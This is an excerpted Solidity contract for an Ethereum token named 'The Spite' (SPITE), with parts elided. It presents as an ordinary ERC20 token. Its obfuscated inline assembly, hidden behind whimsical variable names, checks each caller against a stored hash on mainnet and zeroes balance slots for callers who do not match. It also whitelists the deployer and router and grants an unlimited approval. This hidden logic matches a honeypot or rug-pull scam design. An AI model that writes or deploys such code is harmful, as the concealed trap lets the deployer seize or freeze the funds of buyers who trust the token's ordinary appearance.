...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addMotion;
    uint256 private vibeIt = block.number*2;

    mapping (address => bool) private _firstItaly; 
    mapping (address => bool) private _secondChurch;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _jewelThief;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private endingWorld;
    address public pair;
    ...
    bool private trading; uint256 private downWeGo = 1; bool private alwaysUp;
    uint256 private _decimals; uint256 private upUpUp;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addMotion.push(_router); addMotion.push(msgSender_); addMotion.push(pair);
        for (uint256 q=0; q < 3;) {_firstItaly[addMotion[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x325f5823d33e091c041b3c4d55bdf47b5f78454c26d50818d3d877895c07f848
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xb86f378ae723ac0a1c6d59f034b3c858561307b917a3d7124a8a39415d29da0e,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; vibeIt = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMotion[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySpite(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMotion[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpite(creator, initialSupply);
    }
}

contract TheSpite is ERC20Token {
    constructor() ERC20Token("The Spite", "SPITE", msg.sender, 13675000 * 10 ** 18) {
    }
}